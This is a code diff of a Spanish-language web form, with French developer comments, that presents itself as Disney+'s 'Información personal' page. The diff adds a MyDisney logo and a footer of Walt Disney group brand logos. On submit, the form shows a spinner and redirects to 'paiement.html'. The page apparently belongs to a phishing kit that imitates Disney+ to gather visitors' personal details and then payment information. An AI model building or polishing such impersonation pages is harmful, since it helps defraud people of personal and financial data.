@@ -6,15 +6,11 @@
   <title>Información personal | Disney+</title>
   <!-- CSS commun -->
   <link rel="stylesheet" href="style.css"/>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet"/>
 </head>
-<body>
-
-  <main class="main-content">
-    <!-- Logo centré -->
-    <img src="Images/compose2.png"
-         alt="Disney+"
-         style="display:block; margin:0 auto 30px; width:160px;"/>
+<body class="page-form">
+  <main>
+    <!-- Logo MyDisney centré en haut de la carte -->
+    <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo"/>
 
     <h1>Información personal</h1>
 
@@ -35,9 +31,24 @@
       <input type="tel" placeholder="Teléfono" required/>
       <button type="submit">Continuar</button>
     </form>
+
+    <!-- Note de bas de page + logos partenaires -->
+    <div class="footer-note">
+      <strong>Disney+ forma parte del grupo Walt Disney</strong><br/>
+      MyDisney te da acceso a servicios como Disney+, ESPN, Walt Disney World <a href="#">y más</a>.
+      <div class="logos-container">
+        <img src="Images/compose2.png" alt="Disney+"/>
+        <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
+        <img src="Images/espn-png-logo-4149.png" alt="ESPN"/>
+        <img src="Images/marvel-logo-34291.png" alt="Marvel"/>
+        <img src="Images/star-wars-logo-1002.png" alt="Star Wars"/>
+        <img src="Images/Hulu-Logo-PNG.png" alt="Hulu"/>
+        <img src="Images/natgeo-logo.png" alt="National Geographic"/>
+      </div>
+    </div>
   </main>
 
-  <!-- Spinner overlay (défini dans style.css) -->
+  <!-- Overlay du spinner -->
   <div id="spinnerOverlay">
     <div class="spinner"></div>
   </div>
@@ -47,7 +58,7 @@
       e.preventDefault();
       // Affiche le spinner
       document.getElementById("spinnerOverlay").style.display = "flex";
-      // Redirige après 2,5s
+      // Redirige après 2,5 secondes
       setTimeout(() => {
         window.location.href = "paiement.html";
       }, 2500);
